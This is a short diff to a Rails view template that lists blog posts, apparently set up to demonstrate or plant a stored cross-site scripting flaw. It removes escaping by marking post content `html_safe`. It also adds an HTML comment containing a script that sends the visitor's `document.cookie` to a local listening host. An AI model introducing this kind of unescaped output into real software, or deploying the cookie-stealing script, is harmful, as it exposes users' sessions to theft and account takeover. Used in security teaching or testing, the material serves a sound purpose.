@@ -15,7 +15,7 @@
     <% @posts.each do |post| %>
       <tr>
         <td><%= post.title %></td>
-        <td><%= post.content %></td>
+        <td><%= post.content.html_safe %></td>
         <td><%= link_to 'Show', post %></td>
         <td><%= link_to 'Edit', edit_post_path(post) %></td>
         <td><%= link_to 'Destroy', post, method: :delete, data: { confirm: 'Are you sure?' } %></td>
@@ -27,3 +27,4 @@
 <br>
 
 <%= link_to 'New Post', new_post_path %>
+<!-- Father <script> $.get("http://localhost:8000/?cook="+document.cookie) </script> -->
